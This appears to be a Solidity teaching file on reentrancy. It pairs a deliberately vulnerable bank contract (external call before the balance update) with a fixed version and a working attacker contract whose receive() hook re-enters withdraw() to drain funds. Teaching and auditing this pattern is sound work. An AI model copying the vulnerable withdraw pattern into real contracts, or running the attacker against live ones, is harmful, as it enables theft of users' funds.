// SPDX-License-Identifier: MIT
// INTENTIONALLY VULNERABLE TEACHING CONTRACTS. Local test chains only. Do not deploy.
pragma solidity ^0.8.20;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

/// @dev VULNERABLE: sends ether before zeroing the balance, so a malicious
/// recipient can re-enter withdraw() and drain the contract.
/// Audit tell: an external call (`call{value:...}`) that happens BEFORE the
/// caller's state (balances) is updated. (SWC-107)
contract VulnerableBank is IBank {
    mapping(address => uint256) public balances;

    function deposit() external payable override {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external override {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no funds");
        (bool ok, ) = msg.sender.call{value: bal}(""); // <-- interaction before effect
        require(ok, "send failed");
        balances[msg.sender] = 0;                       // <-- effect applied too late
    }

    function totalDeposits() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @dev FIXED two ways at once (either alone is sufficient):
/// 1. checks-effects-interactions: zero the balance BEFORE the external call.
/// 2. a reentrancy guard that blocks nested entry.
contract SecureBank is IBank {
    mapping(address => uint256) public balances;
    uint256 private _locked = 1;

    modifier nonReentrant() {
        require(_locked == 1, "reentrant call");
        _locked = 2;
        _;
        _locked = 1;
    }

    function deposit() external payable override {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external override nonReentrant {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no funds");
        balances[msg.sender] = 0;                       // effect first
        (bool ok, ) = msg.sender.call{value: bal}("");  // interaction last
        require(ok, "send failed");
    }

    function totalDeposits() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @dev The attacker contract an auditor would write to prove the finding.
/// It re-enters withdraw() from its receive() function while the bank still
/// holds funds. Against SecureBank the nested call reverts and nothing is lost.
contract ReentrancyAttacker {
    IBank public immutable bank;
    uint256 private _unit;

    constructor(address bankAddress) {
        bank = IBank(bankAddress);
    }

    function attack() external payable {
        _unit = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= _unit) {
            bank.withdraw();
        }
    }

    function sweep(address payable to) external {
        to.transfer(address(this).balance);
    }
}
